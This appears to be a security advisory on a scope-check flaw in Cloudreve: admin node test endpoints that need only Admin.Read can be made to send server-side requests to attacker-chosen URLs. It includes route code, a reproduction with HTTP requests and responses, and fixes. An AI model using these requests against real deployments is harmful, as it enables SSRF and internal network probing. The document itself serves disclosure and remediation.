## Details
## Summary

Cloudreve exposes two admin node test endpoints under the `Admin.Read` OAuth scope. These endpoints accept attacker-controlled node definitions and cause Cloudreve to make outbound server-side network requests. This allows an OAuth client authorized only for `Admin.Read` to trigger operational network actions that should require `Admin.Write`.

## Impact

An attacker who obtains an admin-authorized OAuth token with `Admin.Read` but not `Admin.Write` can make the Cloudreve server connect to arbitrary URLs supplied in the request body. This can be used for blind SSRF, internal service probing, and triggering signed Cloudreve slave-style requests to attacker-chosen endpoints.

## Affected version

Verified in source and runtime on latest master commit `ba2e870bbd17f1918dd2321de861e453f696d6a3` and latest observed tag `4.16.1`.

## Technical details

The authenticated admin route group requires only `Admin.Read`:

```go
auth := v4.Group("")
auth.Use(middleware.LoginRequired())
auth.Use(middleware.RequiredScopes(types.ScopeAdminRead))
admin := auth.Group("admin", middleware.IsAdmin())
```

The following routes are registered without `ScopeAdminWrite`:

```go
node.POST("test",
    controllers.FromJSON[adminsvc.TestNodeService](adminsvc.TestNodeParamCtx{}),
    controllers.AdminTestSlave,
)
node.POST("test/downloader",
    controllers.FromJSON[adminsvc.TestNodeDownloaderService](adminsvc.TestNodeDownloaderParamCtx{}),
    controllers.AdminTestDownloader,
)
```

By contrast, node create, update, and delete routes do require `Admin.Write`:

```go
node.PUT("", middleware.RequiredScopes(types.ScopeAdminWrite), ...)
node.PUT(":id", middleware.RequiredScopes(types.ScopeAdminWrite), ...)
node.DELETE(":id", middleware.RequiredScopes(types.ScopeAdminWrite), ...)
```

`TestNodeService.Test()` parses the attacker-supplied node server and sends a request to it:

```go
slave, err := url.Parse(service.Node.Server)
...
res, err := r.Request(
    "POST",
    routes.SlavePingRoute(slave),
    bytes.NewReader(bodyByte),
    ...
)
```

`TestNodeDownloaderService.Test()` constructs a downloader from attacker-supplied node settings and invokes its network test method.

## Reproduction

The following was verified against a disposable Cloudreve instance built from the affected commit.

Prerequisite: an admin user authorizes an OAuth client with `Admin.Read` but not `Admin.Write`.

1. Obtain an OAuth access token whose scope is only:

```text
openid Admin.Read
```

The returned token response contains:

```json
{
  "token_type": "Bearer",
  "scope": "openid Admin.Read"
}
```

2. Confirm the token cannot perform an `Admin.Write` node operation:

```http
PUT /api/v4/admin/node HTTP/1.1
Authorization: Bearer <admin-read-oauth-token>
Content-Type: application/json

{
  "node": {
    "name": "deny-control",
    "server": "http://127.0.0.1:18080",
    "type": "slave",
    "slave_key": "poc"
  }
}
```

Observed response:

```json
{
  "code": 40089,
  "msg": "Insufficient scope: Admin.Write"
}
```

3. Use the same `Admin.Read`-only OAuth token to call the node test endpoint with an attacker-controlled server URL:

```http
POST /api/v4/admin/node/test HTTP/1.1
Authorization: Bearer <admin-read-oauth-token>
Content-Type: application/json

{
  "node": {
    "id": 124,
    "name": "ssrf-poc",
    "server": "http://127.0.0.1:18080",
    "type": "slave",
    "slave_key": "attacker-controlled-key"
  }
}
```

Observed Cloudreve response:

```json
{
  "code": 0,
  "msg": ""
}
```

4. The canary server at `127.0.0.1:18080` received the backend request:

```http
POST /api/v4/slave/ping HTTP/1.1
Host: 127.0.0.1:18080
User-Agent: Cloudreve/4.14.0
Authorization: Bearer Cr <hmac-signature>:<timestamp>
X-Cr-Node-Id: 124
X-Cr-Site-Url: http://127.0.0.1:15212
Content-Length: 37

{"callback":"http://127.0.0.1:15212"}
```

This proves the `Admin.Read`-only OAuth token is denied on a sibling `Admin.Write` route but can still trigger a server-side request to an attacker-selected node URL through the test route.

## Root cause

The route group enforces `Admin.Read` by default and relies on per-route `Admin.Write` middleware for operations that mutate state or perform operational side effects. The node test endpoints were omitted from the `Admin.Write` set even though they execute server-side network actions using attacker-supplied configuration.

## Remediation

- Add `middleware.RequiredScopes(types.ScopeAdminWrite)` to both node test routes.
- Consider applying SSRF validation or network egress controls to all admin-supplied test URLs.
- Audit other admin test endpoints for read-scoped side effects.
